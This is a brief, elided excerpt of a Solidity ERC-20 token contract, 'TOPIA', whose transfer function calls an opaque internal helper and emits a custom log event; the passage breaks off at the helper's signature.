...
contract TOPIA is IERC20, IERC20Metadata {
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        (bool dt, string memory st) = topia(  amount, "TOPIA",false, bytes("TOPIA"), false);
        if (dt) emit tlog(st);
        emit Transfer(from, to, amount);
    }

    function topia(uint256 px, string memory sx, bool dx, bytes memory dx0, bool dxs) 
